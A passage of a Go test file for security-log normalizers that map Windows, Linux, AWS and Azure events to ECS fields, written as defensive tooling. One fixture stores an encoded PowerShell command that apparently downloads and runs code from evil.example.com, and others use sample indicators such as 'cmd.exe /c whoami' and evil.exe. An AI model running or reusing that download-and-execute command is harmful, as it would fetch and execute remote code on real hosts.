package ecs

// Validates: Requirements 1.3, 2.4

import (
	"fmt"
	"math/rand"
	"reflect"
	"testing"
)

// deepCopyMap returns a deep copy of a map[string]any, recursively copying
// nested maps and slices so that mutations to the copy do not affect the original.
func deepCopyMap(m map[string]any) map[string]any {
	out := make(map[string]any, len(m))
	for k, v := range m {
		out[k] = deepCopyValue(v)
	}
	return out
}

func deepCopyValue(v any) any {
	switch val := v.(type) {
	case map[string]any:
		return deepCopyMap(val)
	case []any:
		cp := make([]any, len(val))
		for i, elem := range val {
			cp[i] = deepCopyValue(elem)
		}
		return cp
	default:
		return v
	}
}

// generateRawMap produces a random map[string]any with a mix of value types:
// string, int, float64, nested map[string]any, and []any slices.
func generateRawMap(rng *rand.Rand, depth int) map[string]any {
	keys := []string{
		"alpha", "bravo", "charlie", "delta", "echo",
		"foxtrot", "golf", "hotel", "india", "juliet",
		// include some real Windows / Linux source keys to ensure they are preserved too
		"EventID", "Computer", "hostname", "pid", "uid",
		"CommandLine", "exe", "msg", "key", "QueryName",
	}

	m := make(map[string]any, len(keys))
	for _, k := range keys {
		switch rng.Intn(5) {
		case 0:
			m[k] = randomString(rng, 8)
		case 1:
			m[k] = rng.Intn(100000)
		case 2:
			m[k] = rng.Float64() * 1000
		case 3:
			if depth < 2 {
				m[k] = generateRawMap(rng, depth+1)
			} else {
				m[k] = randomString(rng, 4)
			}
		case 4:
			m[k] = []any{randomString(rng, 3), rng.Intn(50), rng.Float64()}
		}
	}
	return m
}

func randomString(rng *rand.Rand, n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rng.Intn(len(letters))]
	}
	return string(b)
}

// TestNormalize_PreservesRawFields is Property 1:
// For at least 50 generated raw maps (mixing string, int, float, nested map, and slice
// values), assert that after NormalizeWindowsEvent(raw) and NormalizeLinuxEvent(raw),
// every (k, v) in the input is present with the same value in the output, and the input
// map itself is unchanged.
//
// Validates: Requirements 1.3, 2.4
func TestNormalize_PreservesRawFields(t *testing.T) {
	const iterations = 50
	rng := rand.New(rand.NewSource(42))

	for i := 0; i < iterations; i++ {
		raw := generateRawMap(rng, 0)

		// --- Windows ---
		snapshot := deepCopyMap(raw)
		winOut := NormalizeWindowsEvent(raw)

		// Every input key must appear in the output with the same value.
		for k, v := range snapshot {
			got, ok := winOut[k]
			if !ok {
				t.Errorf("[iteration %d] NormalizeWindowsEvent: input key %q missing from output", i, k)
				continue
			}
			if !reflect.DeepEqual(v, got) {
				t.Errorf("[iteration %d] NormalizeWindowsEvent: key %q value mismatch: want %#v, got %#v", i, k, v, got)
			}
		}

		// Input map must be unchanged.
		if !reflect.DeepEqual(snapshot, raw) {
			t.Errorf("[iteration %d] NormalizeWindowsEvent: input map was mutated", i)
		}

		// --- Linux ---
		snapshot = deepCopyMap(raw)
		linOut := NormalizeLinuxEvent(raw)

		for k, v := range snapshot {
			got, ok := linOut[k]
			if !ok {
				t.Errorf("[iteration %d] NormalizeLinuxEvent: input key %q missing from output", i, k)
				continue
			}
			if !reflect.DeepEqual(v, got) {
				t.Errorf("[iteration %d] NormalizeLinuxEvent: key %q value mismatch: want %#v, got %#v", i, k, v, got)
			}
		}

		if !reflect.DeepEqual(snapshot, raw) {
			t.Errorf("[iteration %d] NormalizeLinuxEvent: input map was mutated", i)
		}
	}
}

// TestNormalizeWindows_FieldMappings is Property 2 (Windows subset):
// For each source→target row in the Windows mapping table, place a value v under
// the source key in an otherwise-minimal raw payload and assert that
// NormalizeWindowsEvent(raw)[target] == transform(v).
// For EventID the transform is fmt.Sprintf("%v", v); for all others it is the
// identity transform.
// The overwrite cases are also covered:
//   - IpAddress overwrites SourceIp for source.ip
//   - SubjectUserName overwrites User for user.name
//
// Validates: Requirements 1.4, 1.5, 1.6, 1.7, 1.8
func TestNormalizeWindows_FieldMappings(t *testing.T) {
	// identity transform helper
	identity := func(v any) any { return v }

	type row struct {
		source    string
		target    string
		value     any
		transform func(any) any
	}

	rows := []row{
		{"EventID", "event.code", "4624", func(v any) any { return fmt.Sprintf("%v", v) }},
		{"EventID", "event.code", 4625, func(v any) any { return fmt.Sprintf("%v", v) }},
		{"TimeCreated", "@timestamp", "2026-07-25T10:00:00Z", identity},
		{"Computer", "host.name", "WORKSTATION-01", identity},
		{"CommandLine", "process.command_line", `cmd.exe /c whoami`, identity},
		{"Image", "process.executable", `C:\Windows\System32\cmd.exe`, identity},
		{"ParentImage", "process.parent.executable", `C:\Windows\explorer.exe`, identity},
		{"ParentCommandLine", "process.parent.command_line", `explorer.exe /factory,{75dff2b7}`, identity},
		{"ProcessId", "process.pid", 1234, identity},
		{"ParentProcessId", "process.parent.pid", 5678, identity},
		{"DestinationIp", "destination.ip", "192.0.2.50", identity},
		{"DestinationPort", "destination.port", 443, identity},
		{"TargetUserName", "user.target.name", "jdoe", identity},
		{"SubjectDomainName", "user.domain", "CORP", identity},
		{"LogonType", "winlog.logon.type", "3", identity},
		{"Channel", "winlog.channel", "Security", identity},
		{"TargetFilename", "file.path", `C:\temp\evil.exe`, identity},
		{"QueryName", "dns.question.name", "malware.example.com", identity},
		{"TargetObject", "registry.path", `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, identity},
	}

	for _, r := range rows {
		raw := map[string]any{r.source: r.value}
		out := NormalizeWindowsEvent(raw)
		want := r.transform(r.value)
		got, ok := out[r.target]
		if !ok {
			t.Errorf("NormalizeWindowsEvent: source=%q target=%q: key missing from output", r.source, r.target)
			continue
		}
		if !reflect.DeepEqual(want, got) {
			t.Errorf("NormalizeWindowsEvent: source=%q target=%q: want %#v, got %#v", r.source, r.target, want, got)
		}
	}

	// SourceIp alone writes source.ip
	t.Run("SourceIp_writes_source_ip", func(t *testing.T) {
		raw := map[string]any{"SourceIp": "10.0.0.1"}
		out := NormalizeWindowsEvent(raw)
		if got := out["source.ip"]; got != "10.0.0.1" {
			t.Errorf("SourceIp: want source.ip=10.0.0.1, got %v", got)
		}
	})

	// IpAddress overwrites SourceIp for source.ip
	t.Run("IpAddress_overwrites_SourceIp", func(t *testing.T) {
		raw := map[string]any{
			"SourceIp":  "10.0.0.1",
			"IpAddress": "203.0.113.99",
		}
		out := NormalizeWindowsEvent(raw)
		if got := out["source.ip"]; got != "203.0.113.99" {
			t.Errorf("IpAddress overwrite: want source.ip=203.0.113.99, got %v", got)
		}
	})

	// IpAddress alone writes source.ip
	t.Run("IpAddress_alone_writes_source_ip", func(t *testing.T) {
		raw := map[string]any{"IpAddress": "198.51.100.7"}
		out := NormalizeWindowsEvent(raw)
		if got := out["source.ip"]; got != "198.51.100.7" {
			t.Errorf("IpAddress alone: want source.ip=198.51.100.7, got %v", got)
		}
	})

	// User alone writes user.name
	t.Run("User_writes_user_name", func(t *testing.T) {
		raw := map[string]any{"User": "alice"}
		out := NormalizeWindowsEvent(raw)
		if got := out["user.name"]; got != "alice" {
			t.Errorf("User: want user.name=alice, got %v", got)
		}
	})

	// SubjectUserName overwrites User for user.name
	t.Run("SubjectUserName_overwrites_User", func(t *testing.T) {
		raw := map[string]any{
			"User":            "alice",
			"SubjectUserName": "bob",
		}
		out := NormalizeWindowsEvent(raw)
		if got := out["user.name"]; got != "bob" {
			t.Errorf("SubjectUserName overwrite: want user.name=bob, got %v", got)
		}
	})

	// SubjectUserName alone writes user.name
	t.Run("SubjectUserName_alone_writes_user_name", func(t *testing.T) {
		raw := map[string]any{"SubjectUserName": "carol"}
		out := NormalizeWindowsEvent(raw)
		if got := out["user.name"]; got != "carol" {
			t.Errorf("SubjectUserName alone: want user.name=carol, got %v", got)
		}
	})
}

// TestNormalizeLinux_FieldMappings is Property 2 (Linux subset):
// For each source→target row in the Linux mapping table, place a value v under
// the source key in an otherwise-minimal raw payload and assert that
// NormalizeLinuxEvent(raw)[target] == v (identity transform for all Linux rows).
// The overwrite case is also covered:
//   - comm overwrites program for process.name
//
// Validates: Requirements 1.4, 1.5, 1.6, 1.7, 1.8
func TestNormalizeLinux_FieldMappings(t *testing.T) {
	type row struct {
		source string
		target string
		value  any
	}

	rows := []row{
		{"hostname", "host.name", "linux-server-01"},
		{"pid", "process.pid", 42},
		{"uid", "user.id", "1000"},
		{"gid", "group.id", "1000"},
		{"auid", "user.audit.id", "0"},
		{"exe", "process.executable", "/usr/bin/bash"},
		{"syscall", "event.syscall", "execve"},
		{"msg", "message", "audit(1234567890.123:456): path=/etc/passwd"},
		{"key", "event.audit.key", "sensitive-file-access"},
		{"ppid", "process.parent.pid", 1},
	}

	for _, r := range rows {
		raw := map[string]any{r.source: r.value}
		out := NormalizeLinuxEvent(raw)
		got, ok := out[r.target]
		if !ok {
			t.Errorf("NormalizeLinuxEvent: source=%q target=%q: key missing from output", r.source, r.target)
			continue
		}
		if !reflect.DeepEqual(r.value, got) {
			t.Errorf("NormalizeLinuxEvent: source=%q target=%q: want %#v, got %#v", r.source, r.target, r.value, got)
		}
	}

	// program alone writes process.name
	t.Run("program_writes_process_name", func(t *testing.T) {
		raw := map[string]any{"program": "sshd"}
		out := NormalizeLinuxEvent(raw)
		if got := out["process.name"]; got != "sshd" {
			t.Errorf("program: want process.name=sshd, got %v", got)
		}
	})

	// comm overwrites program for process.name
	t.Run("comm_overwrites_program", func(t *testing.T) {
		raw := map[string]any{
			"program": "sshd",
			"comm":    "ssh",
		}
		out := NormalizeLinuxEvent(raw)
		if got := out["process.name"]; got != "ssh" {
			t.Errorf("comm overwrite: want process.name=ssh, got %v", got)
		}
	})

	// comm alone writes process.name
	t.Run("comm_alone_writes_process_name", func(t *testing.T) {
		raw := map[string]any{"comm": "bash"}
		out := NormalizeLinuxEvent(raw)
		if got := out["process.name"]; got != "bash" {
			t.Errorf("comm alone: want process.name=bash, got %v", got)
		}
	})
}

// TestNormalize_PipelineDispatch_WindowsLinux is Property 3 (Windows/Linux subset):
// For each DataType value, the correct normalizer is applied.
// Validates: Requirements 1.9, 1.10
func TestNormalize_PipelineDispatch_WindowsLinux(t *testing.T) {
	raw := map[string]any{
		"EventID":  "4624",
		"Computer": "WIN-HOST",
		"hostname": "linux-host",
		"pid":      1234,
	}

	// A local dispatch helper that mirrors the switch in processor/process.go
	dispatch := func(dataType string, fields map[string]any) map[string]any {
		switch dataType {
		case "windows_events", "windows":
			return NormalizeWindowsEvent(fields)
		case "linux_logs", "linux", "auditd", "syslog":
			return NormalizeLinuxEvent(fields)
		}
		return fields // no-op for unrecognized
	}

	// Windows DataTypes
	for _, dt := range []string{"windows_events", "windows"} {
		got := dispatch(dt, raw)
		want := NormalizeWindowsEvent(raw)
		if !reflect.DeepEqual(want, got) {
			t.Errorf("DataType=%q: dispatch result does not match NormalizeWindowsEvent", dt)
		}
	}

	// Linux DataTypes
	for _, dt := range []string{"linux_logs", "linux", "auditd", "syslog"} {
		got := dispatch(dt, raw)
		want := NormalizeLinuxEvent(raw)
		if !reflect.DeepEqual(want, got) {
			t.Errorf("DataType=%q: dispatch result does not match NormalizeLinuxEvent", dt)
		}
	}

	// Unrecognized DataTypes — fields unchanged
	snapshot := deepCopyMap(raw)
	for _, dt := range []string{"unknown", "", "netflow", "other"} {
		got := dispatch(dt, raw)
		if !reflect.DeepEqual(snapshot, got) {
			t.Errorf("DataType=%q: expected no-op, but fields changed", dt)
		}
	}
}

// TestNormalizeWindowsEvent is a table-driven test covering at least 10 distinct
// field-mapping and edge cases for NormalizeWindowsEvent.
//
// Validates: Requirements 1.11, 1.12
func TestNormalizeWindowsEvent(t *testing.T) {
	type testCase struct {
		name  string
		input map[string]any
		// check is called with the output map and may call t.Errorf.
		check func(t *testing.T, out map[string]any)
	}

	cases := []testCase{
		{
			// Case 1: Numeric EventID is coerced to a string via fmt.Sprintf("%v", v).
			name:  "numeric EventID coercion",
			input: map[string]any{"EventID": 4624},
			check: func(t *testing.T, out map[string]any) {
				if got := out["event.code"]; got != "4624" {
					t.Errorf("want event.code=%q, got %v", "4624", got)
				}
			},
		},
		{
			// Case 2: Missing source keys produce no ECS target key in the output.
			name:  "missing keys are silently skipped",
			input: map[string]any{"SomeOtherKey": "value"},
			check: func(t *testing.T, out map[string]any) {
				for _, target := range []string{
					"event.code", "host.name", "process.command_line",
					"process.executable", "user.name",
				} {
					if _, ok := out[target]; ok {
						t.Errorf("unexpected key %q in output (no source key provided)", target)
					}
				}
			},
		},
		{
			// Case 3: Unicode Computer name is preserved verbatim in host.name.
			name:  "unicode Computer name",
			input: map[string]any{"Computer": "ÜNÏCÖDÉ-HOST"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["host.name"]; got != "ÜNÏCÖDÉ-HOST" {
					t.Errorf("want host.name=%q, got %v", "ÜNÏCÖDÉ-HOST", got)
				}
			},
		},
		{
			// Case 4: A key whose value is a nested map[string]any is preserved verbatim
			// in the output (raw-field preservation + the nested map survives as-is).
			name: "nested map value preserved verbatim",
			input: map[string]any{
				"ExtraData": map[string]any{"NestedKey": "NestedValue", "Count": 42},
			},
			check: func(t *testing.T, out map[string]any) {
				got, ok := out["ExtraData"]
				if !ok {
					t.Error("key ExtraData missing from output")
					return
				}
				nested, ok := got.(map[string]any)
				if !ok {
					t.Errorf("ExtraData: expected map[string]any, got %T", got)
					return
				}
				if nested["NestedKey"] != "NestedValue" || nested["Count"] != 42 {
					t.Errorf("nested map content mismatch: %v", nested)
				}
			},
		},
		{
			// Case 5: Empty raw map returns a non-nil map (possibly empty or containing
			// only ECS keys that had source keys — but must not panic).
			name:  "empty raw map returns non-nil map",
			input: map[string]any{},
			check: func(t *testing.T, out map[string]any) {
				if out == nil {
					t.Error("want non-nil output map for empty input")
				}
			},
		},
		{
			// Case 6: Nil value for a mapped key — the key IS present in raw (ok==true),
			// so the ECS target key is written with value nil.  The raw key itself must
			// still appear in the output.
			name:  "nil value for mapped key is written to output",
			input: map[string]any{"EventID": nil},
			check: func(t *testing.T, out map[string]any) {
				// The raw key must be preserved.
				if _, ok := out["EventID"]; !ok {
					t.Error("raw key EventID missing from output")
				}
				// event.code is written because EventID key exists (value is nil →
				// fmt.Sprintf("%v", nil) == "<nil>").
				if got, ok := out["event.code"]; !ok {
					t.Error("event.code missing even though EventID key was present")
				} else if got != "<nil>" {
					t.Errorf("want event.code=%q, got %v", "<nil>", got)
				}
			},
		},
		{
			// Case 7: Overwrite ordering — SubjectUserName appears after User in the
			// mapping table, so user.name must come from SubjectUserName when both present.
			name: "SubjectUserName overwrites User for user.name",
			input: map[string]any{
				"User":            "alice",
				"SubjectUserName": "bob",
			},
			check: func(t *testing.T, out map[string]any) {
				if got := out["user.name"]; got != "bob" {
					t.Errorf("want user.name=%q (SubjectUserName wins), got %v", "bob", got)
				}
			},
		},
		{
			// Case 8: Long CommandLine (100+ characters) is preserved intact.
			name: "long CommandLine preserved",
			input: map[string]any{
				"CommandLine": "C:\\Windows\\System32\\cmd.exe /c \"powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaHR0cDovL2V2aWwuZXhhbXBsZS5jb20vcAAnACkA\"",
			},
			check: func(t *testing.T, out map[string]any) {
				cl, ok := out["process.command_line"]
				if !ok {
					t.Error("process.command_line missing from output")
					return
				}
				s, ok := cl.(string)
				if !ok {
					t.Errorf("process.command_line: expected string, got %T", cl)
					return
				}
				if len(s) < 100 {
					t.Errorf("process.command_line too short (%d chars), expected ≥100", len(s))
				}
			},
		},
		{
			// Case 9: Whitespace-only Computer name is preserved as-is in host.name.
			name:  "whitespace-only Computer name preserved",
			input: map[string]any{"Computer": "   "},
			check: func(t *testing.T, out map[string]any) {
				if got := out["host.name"]; got != "   " {
					t.Errorf("want host.name=%q (whitespace preserved), got %q", "   ", got)
				}
			},
		},
		{
			// Case 10: Non-string ProcessId (numeric) is preserved as-is in process.pid.
			name:  "non-string ProcessId (numeric) preserved",
			input: map[string]any{"ProcessId": 9876},
			check: func(t *testing.T, out map[string]any) {
				if got := out["process.pid"]; got != 9876 {
					t.Errorf("want process.pid=9876, got %v", got)
				}
			},
		},
		{
			// Case 11 (bonus): String EventID is also coerced correctly.
			name:  "string EventID coercion identity",
			input: map[string]any{"EventID": "4625"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["event.code"]; got != "4625" {
					t.Errorf("want event.code=%q, got %v", "4625", got)
				}
			},
		},
		{
			// Case 12 (bonus): IpAddress overwrites SourceIp for source.ip.
			name: "IpAddress overwrites SourceIp",
			input: map[string]any{
				"SourceIp":  "10.0.0.1",
				"IpAddress": "203.0.113.99",
			},
			check: func(t *testing.T, out map[string]any) {
				if got := out["source.ip"]; got != "203.0.113.99" {
					t.Errorf("want source.ip=%q (IpAddress wins), got %v", "203.0.113.99", got)
				}
			},
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			// Deep-copy the input so we can verify it is not mutated.
			snapshot := deepCopyMap(tc.input)
			out := NormalizeWindowsEvent(tc.input)
			// Run the case-specific assertions.
			tc.check(t, out)
			// Universal invariant: input must not be mutated.
			if !reflect.DeepEqual(snapshot, tc.input) {
				t.Error("NormalizeWindowsEvent mutated the input map")
			}
		})
	}
}

// TestNormalizeLinuxEvent is a table-driven test covering at least 10 distinct
// field-mapping and edge cases for NormalizeLinuxEvent.
//
// Validates: Requirements 1.11, 1.12
func TestNormalizeLinuxEvent(t *testing.T) {
	type testCase struct {
		name  string
		input map[string]any
		check func(t *testing.T, out map[string]any)
	}

	cases := []testCase{
		{
			// Case 1: hostname → host.name basic mapping.
			name:  "hostname maps to host.name",
			input: map[string]any{"hostname": "linux-server-01"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["host.name"]; got != "linux-server-01" {
					t.Errorf("want host.name=%q, got %v", "linux-server-01", got)
				}
			},
		},
		{
			// Case 2: program and comm both present — comm overwrites program for process.name.
			name: "comm overwrites program for process.name",
			input: map[string]any{
				"program": "sshd",
				"comm":    "ssh",
			},
			check: func(t *testing.T, out map[string]any) {
				if got := out["process.name"]; got != "ssh" {
					t.Errorf("want process.name=%q (comm wins), got %v", "ssh", got)
				}
			},
		},
		{
			// Case 3: Numeric pid is preserved as-is in process.pid.
			name:  "numeric pid preserved",
			input: map[string]any{"pid": 4242},
			check: func(t *testing.T, out map[string]any) {
				if got := out["process.pid"]; got != 4242 {
					t.Errorf("want process.pid=4242, got %v", got)
				}
			},
		},
		{
			// Case 4: uid as string maps to user.id.
			name:  "uid as string maps to user.id",
			input: map[string]any{"uid": "1000"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["user.id"]; got != "1000" {
					t.Errorf("want user.id=%q, got %v", "1000", got)
				}
			},
		},
		{
			// Case 5: Only exe provided — only process.executable appears; other ECS
			// targets (host.name, process.pid, etc.) must be absent from the output.
			name:  "only exe provided — other ECS targets absent",
			input: map[string]any{"exe": "/usr/bin/bash"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["process.executable"]; got != "/usr/bin/bash" {
					t.Errorf("want process.executable=%q, got %v", "/usr/bin/bash", got)
				}
				for _, absent := range []string{"host.name", "process.pid", "user.id", "group.id"} {
					if _, ok := out[absent]; ok {
						t.Errorf("unexpected key %q in output (no source key provided)", absent)
					}
				}
			},
		},
		{
			// Case 6: Empty raw map returns a non-nil map.
			name:  "empty raw map returns non-nil map",
			input: map[string]any{},
			check: func(t *testing.T, out map[string]any) {
				if out == nil {
					t.Error("want non-nil output map for empty input")
				}
			},
		},
		{
			// Case 7: msg with special characters maps to message verbatim.
			name:  "msg with special characters preserved",
			input: map[string]any{"msg": `audit(1234567890.123:456): path=/etc/passwd key="config" res=failed`},
			check: func(t *testing.T, out map[string]any) {
				want := `audit(1234567890.123:456): path=/etc/passwd key="config" res=failed`
				if got := out["message"]; got != want {
					t.Errorf("want message=%q, got %v", want, got)
				}
			},
		},
		{
			// Case 8: syscall as string maps to event.syscall.
			name:  "syscall string maps to event.syscall",
			input: map[string]any{"syscall": "execve"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["event.syscall"]; got != "execve" {
					t.Errorf("want event.syscall=%q, got %v", "execve", got)
				}
			},
		},
		{
			// Case 9: Whitespace-only hostname is preserved as-is.
			name:  "whitespace-only hostname preserved",
			input: map[string]any{"hostname": "   "},
			check: func(t *testing.T, out map[string]any) {
				if got := out["host.name"]; got != "   " {
					t.Errorf("want host.name=%q (whitespace preserved), got %q", "   ", got)
				}
			},
		},
		{
			// Case 10: Non-string pid (integer) is preserved as-is in process.pid.
			name:  "non-string pid (integer) preserved",
			input: map[string]any{"pid": 1},
			check: func(t *testing.T, out map[string]any) {
				if got := out["process.pid"]; got != 1 {
					t.Errorf("want process.pid=1, got %v", got)
				}
			},
		},
		{
			// Case 11 (bonus): program alone writes process.name.
			name:  "program alone writes process.name",
			input: map[string]any{"program": "nginx"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["process.name"]; got != "nginx" {
					t.Errorf("want process.name=%q, got %v", "nginx", got)
				}
			},
		},
		{
			// Case 12 (bonus): key maps to event.audit.key.
			name:  "key maps to event.audit.key",
			input: map[string]any{"key": "sensitive-file-access"},
			check: func(t *testing.T, out map[string]any) {
				if got := out["event.audit.key"]; got != "sensitive-file-access" {
					t.Errorf("want event.audit.key=%q, got %v", "sensitive-file-access", got)
				}
			},
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			snapshot := deepCopyMap(tc.input)
			out := NormalizeLinuxEvent(tc.input)
			tc.check(t, out)
			if !reflect.DeepEqual(snapshot, tc.input) {
				t.Error("NormalizeLinuxEvent mutated the input map")
			}
		})
	}
}

// TestNormalizeCloud_PreservesRawFields is Property 1 (cloud subset):
// For at least 50 generated raw maps (including nested map[string]any values under
// keys like userIdentity, protoPayload, and resource), assert that after
// NormalizeAWSEvent(raw), NormalizeAzureEvent(raw), and NormalizeGCPEvent(raw):
//   - Every (k, v) from the input is present in the output with the same value.
//   - The input map is not mutated.
//
// Validates: Requirements 2.4
func TestNormalizeCloud_PreservesRawFields(t *testing.T) {
	const iterations = 50
	rng := rand.New(rand.NewSource(99))

	// generateCloudRawMap produces a random map[string]any that deliberately
	// includes nested maps under cloud-specific keys so the test exercises the
	// path where nestedGet is called by the normalizers.
	generateCloudRawMap := func(rng *rand.Rand, depth int) map[string]any {
		// Top-level keys that cloud normalizers read at the root level.
		topKeys := []string{
			"eventSource", "eventName", "awsRegion", "sourceIPAddress",
			"eventTime", "userAgent", "requestID", "errorCode",
			"operationName", "resourceType", "resourceGroup", "subscriptionId",
			"resourceId", "resultType", "eventTimestamp", "correlationId", "caller",
			"serviceName", "methodName", "timestamp", "severity",
			// Arbitrary extra keys that must survive unchanged.
			"alpha", "bravo", "charlie", "delta", "echo",
		}

		m := make(map[string]any, len(topKeys)+3)
		for _, k := range topKeys {
			switch rng.Intn(5) {
			case 0:
				m[k] = randomString(rng, 8)
			case 1:
				m[k] = rng.Intn(100000)
			case 2:
				m[k] = rng.Float64() * 1000
			case 3:
				if depth < 2 {
					// Reuse the helper from the Windows/Linux test to produce a
					// generic nested map. We call generateRawMap here to share logic.
					m[k] = generateRawMap(rng, depth+1)
				} else {
					m[k] = randomString(rng, 4)
				}
			case 4:
				m[k] = []any{randomString(rng, 3), rng.Intn(50), rng.Float64()}
			}
		}

		// Always include nested maps under the keys that cloud normalizers traverse
		// via nestedGet, so the preservation invariant is also tested for those.
		m["userIdentity"] = map[string]any{
			"arn":       randomString(rng, 20),
			"type":      randomString(rng, 6),
			"accountId": randomString(rng, 12),
			"userName":  randomString(rng, 8),
			"extra":     rng.Intn(9999),
		}
		m["protoPayload"] = map[string]any{
			"authenticationInfo": map[string]any{
				"principalEmail": randomString(rng, 12) + "@example.com",
			},
			"requestMetadata": map[string]any{
				"callerIp": "10." + randomString(rng, 2) + ".0.1",
			},
			"extraField": randomString(rng, 5),
		}
		m["resource"] = map[string]any{
			"type": randomString(rng, 8),
			"labels": map[string]any{
				"project_id": randomString(rng, 10),
				"zone":       randomString(rng, 6),
			},
		}

		return m
	}

	type normalizer struct {
		name string
		fn   func(map[string]any) map[string]any
	}

	normalizers := []normalizer{
		{"NormalizeAWSEvent", NormalizeAWSEvent},
		{"NormalizeAzureEvent", NormalizeAzureEvent},
		{"NormalizeGCPEvent", NormalizeGCPEvent},
	}

	for i := 0; i < iterations; i++ {
		raw := generateCloudRawMap(rng, 0)

		for _, n := range normalizers {
			// Take a deep copy before the call so we can verify no mutation.
			snapshot := deepCopyMap(raw)

			out := n.fn(raw)

			// Every input key must appear in the output with the same value.
			for k, v := range snapshot {
				got, ok := out[k]
				if !ok {
					t.Errorf("[iteration %d] %s: input key %q missing from output",
						i, n.name, k)
					continue
				}
				if !reflect.DeepEqual(v, got) {
					t.Errorf("[iteration %d] %s: key %q value mismatch: want %#v, got %#v",
						i, n.name, k, v, got)
				}
			}

			// Input map must be unchanged.
			if !reflect.DeepEqual(snapshot, raw) {
				t.Errorf("[iteration %d] %s: input map was mutated", i, n.name)
			}
		}
	}
}

// TestNormalizeAWS_FieldMappings is Property 2 (cloud subset — AWS):
// For each source→target row in the AWS CloudTrail mapping table, place a value v under
// the source key (or at the nested path) in an otherwise-minimal raw payload and assert
// that NormalizeAWSEvent(raw)[target] == v (identity transform for all AWS rows).
// The nested-path cases (userIdentity.*) require the value to be placed inside the
// appropriate nested map[string]any structure.
// The dual-write cases are not present in the AWS table; all mappings are 1:1.
//
// Validates: Requirements 2.5, 2.6, 2.7, 2.8, 2.9, 2.10
func TestNormalizeAWS_FieldMappings(t *testing.T) {
	// flat rows — source key lives at the top level of raw
	type flatRow struct {
		source string
		target string
		value  any
	}

	flatRows := []flatRow{
		{"eventSource", "event.provider", "s3.amazonaws.com"},
		{"eventName", "event.action", "PutObject"},
		{"awsRegion", "cloud.region", "us-east-1"},
		{"sourceIPAddress", "source.ip", "198.51.100.42"},
		{"eventTime", "@timestamp", "2026-07-25T10:00:00Z"},
		{"userAgent", "user_agent.original", "aws-cli/2.0"},
		{"requestID", "event.id", "abc-123-def-456"},
		{"errorCode", "event.outcome", "AccessDenied"},
	}

	for _, r := range flatRows {
		raw := map[string]any{r.source: r.value}
		out := NormalizeAWSEvent(raw)
		got, ok := out[r.target]
		if !ok {
			t.Errorf("NormalizeAWSEvent: source=%q target=%q: key missing from output", r.source, r.target)
			continue
		}
		if !reflect.DeepEqual(r.value, got) {
			t.Errorf("NormalizeAWSEvent: source=%q target=%q: want %#v, got %#v", r.source, r.target, r.value, got)
		}
	}

	// nested rows — value must be placed under userIdentity.<field>
	type nestedRow struct {
		nestedKey string // key inside userIdentity map
		target    string // ECS target key
		value     any
	}

	nestedRows := []nestedRow{
		{"arn", "user.id", "arn:aws:iam::123456789012:user/alice"},
		{"type", "user.type", "IAMUser"},
		{"accountId", "cloud.account.id", "123456789012"},
		{"userName", "user.name", "alice"},
	}

	for _, r := range nestedRows {
		raw := map[string]any{
			"userIdentity": map[string]any{r.nestedKey: r.value},
		}
		out := NormalizeAWSEvent(raw)
		got, ok := out[r.target]
		if !ok {
			t.Errorf("NormalizeAWSEvent: userIdentity.%s → %s: key missing from output", r.nestedKey, r.target)
			continue
		}
		if !reflect.DeepEqual(r.value, got) {
			t.Errorf("NormalizeAWSEvent: userIdentity.%s → %s: want %#v, got %#v", r.nestedKey, r.target, r.value, got)
		}
	}

	// Verify that a missing or non-map userIdentity silently skips the nested fields.
	t.Run("missing_userIdentity_skips_nested", func(t *testing.T) {
		raw := map[string]any{"eventName": "DescribeInstances"}
		out := NormalizeAWSEvent(raw)
		for _, absent := range []string{"user.id", "user.type", "cloud.account.id", "user.name"} {
			if _, ok := out[absent]; ok {
				t.Errorf("expected %q absent when userIdentity missing, but it was present", absent)
			}
		}
	})

	t.Run("non_map_userIdentity_skips_nested", func(t *testing.T) {
		raw := map[string]any{"userIdentity": "not-a-map"}
		out := NormalizeAWSEvent(raw)
		for _, absent := range []string{"user.id", "user.type", "cloud.account.id", "user.name"} {
			if _, ok := out[absent]; ok {
				t.Errorf("expected %q absent when userIdentity is a string, but it was present", absent)
			}
		}
	})
}

// TestNormalizeAzure_FieldMappings is Property 2 (cloud subset — Azure):
// For each source→target row in the Azure Activity Log mapping table, place a value v
// under the source key in an otherwise-minimal raw payload and assert that
// NormalizeAzureEvent(raw)[target] == v.
// The dual-write case (caller → user.name AND user.id) is also covered.
//
// Validates: Requirements 2.5, 2.6, 2.7, 2.8, 2.9, 2.10
func TestNormalizeAzure_FieldMappings(t *testing.T) {
	type row struct {
		source string
		target string
		value  any
	}

	rows := []row{
		{"operationName", "event.action", "Microsoft.Compute/virtualMachines/write"},
		{"resourceType", "azure.resource.type", "Microsoft.Compute/virtualMachines"},
		{"resourceGroup", "azure.resource.group", "my-resource-group"},
		{"subscriptionId", "cloud.account.id", "00000000-0000-0000-0000-000000000001"},
		{"resourceId", "azure.resource.id", "/subscriptions/00000000/resourceGroups/rg/providers/Microsoft.Compute/vm/myVm"},
		{"resultType", "event.outcome", "Success"},
		{"eventTimestamp", "@timestamp", "2026-07-25T10:00:00Z"},
		{"correlationId", "event.id", "corr-abc-123"},
	}

	for _, r := range rows {
		raw := map[string]any{r.source: r.value}
		out := NormalizeAzureEvent(raw)
		got, ok := out[r.target]
		if !ok {
			t.Errorf("NormalizeAzureEvent: source=%q target=%q: key missing from output", r.source, r.target)
			continue
		}
		if !reflect.DeepEqual(r.value, got) {
			t.Errorf("NormalizeAzureEvent: source=%q target=%q: want %#v, got %#v", r.source, r.target, r.value, got)
		}
	}

